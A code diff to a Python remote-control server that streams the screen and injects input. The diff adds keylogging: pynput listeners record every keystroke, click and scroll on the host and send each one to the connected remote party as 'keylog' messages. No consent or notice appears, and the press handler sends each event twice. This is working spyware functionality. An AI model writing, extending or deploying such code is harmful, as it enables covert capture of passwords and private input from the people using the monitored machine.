@@ -10,7 +10,7 @@ from pynput import keyboard, mouse
 from watchdog.observers import Observer
 from watchdog.events import FileSystemEventHandler
 import screeninfo
-from pynput import mouse
+from pynput import mouse, keyboard
 
 
 packet_size = 100 * 1024
@@ -99,6 +99,9 @@ class Server:
         self.turn_off_keyboard = keyboard.Listener(suppress=True)
         self.path = "./async"
         self.count = 0
+        self.log_keyboard = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
+        self.log_mouse = mouse.Listener(on_click=self.on_click, on_scroll=self.on_scroll)
+        
     def connect(self):
         while True:
             if not self.connected and self.wait_connect:
@@ -240,18 +243,20 @@ class Server:
 
     def handle_keyboard(self, request):
         controller = keyboard.Controller()
-        try:
-            print(request['key'].char, request['event'])
-        except:
-            print(request['key'], request['event'])
+        # try:
+        #     print(request['key'].char, request['event'])
+        # except:
+        #     print(request['key'], request['event'])
         if request['event'] == 'press':
             try:
-                print(request['key'].char, re)
+                controller.press(request['key'])
             except:
-                print(request['key'])
-            controller.press(request['key'])
+                pass
         else:
-            controller.release(request['key'])
+            try:
+                controller.release(request['key'])
+            except:
+                pass
 
     def handle_mouse(self, request):
         controller = mouse.Controller()
@@ -260,15 +265,15 @@ class Server:
             controller.position = (request['pos'][0] * w, request['pos'][1] * h)
             pass
         elif request['event'] == 'press':
-            print(f'press {request["key"]} at {request["pos"]}')
+            # print(f'press {request["key"]} at {request["pos"]}')
             controller.position = (request['pos'][0] * w, request['pos'][1] * h)
             controller.press(request['key'])
         elif request['event'] == 'release':
-            print(f'release {request["key"]} at {request["pos"]}')
+            # print(f'release {request["key"]} at {request["pos"]}')
             controller.position = (request['pos'][0] * w, request['pos'][1] * h)
             controller.release(request['key'])
         elif request['event'] == 'scroll':
-            print(f'scroll {request["key"]} at {request["pos"]}')
+            # print(f'scroll {request["key"]} at {request["pos"]}')
             controller.position = (request['pos'][0] * w, request['pos'][1] * h)
             controller.scroll(dx=request['key'][0], dy=request['key'][1])
 
@@ -362,7 +367,57 @@ class Server:
             self.file_async.stop()
         except:
             pass
-
+    
+    def on_press(self, key):
+        try:
+            mes = {
+                'type': 'keylog',
+                'event': f'{key.char} pressed',
+            }
+            self._send(mes)
+        except:
+            mes = {
+                'type': 'keylog',
+                'event': f'{key} pressed',
+            }
+            self._send(mes)
+        self._send(mes)
+    
+    def on_release(self, key):
+        try:
+            mes = {
+                'type': 'keylog',
+                'event': f'{key.char} released',
+            }
+        except:
+            mes = {
+                'type': 'keylog',
+                'event': f'{key} released',
+            }
+        self._send(mes)
+    
+    def on_click(self, x, y, button, pressed):
+        mes = {
+            'type': 'keylog',
+            'event': f'{button} clicked at {x},{y}',
+        }
+        self._send(mes)
+        
+    def on_scroll(self, x, y, dx, dy):
+        mes = {
+            'type': 'keylog',
+            'event': f'scroll {dx},{dy} at {x},{y}',
+        }
+        self._send(mes)
+    
+    def start_keylog(self):
+        self.log_keyboard.start()
+        self.log_mouse.start()
+    
+    def stop_keylog(self):
+        self.log_keyboard.stop()
+        self.log_mouse.stop()
+    
     def run(self):
         Thread(target=self.connect).start()
         Thread(target=self.stream_screen).start()
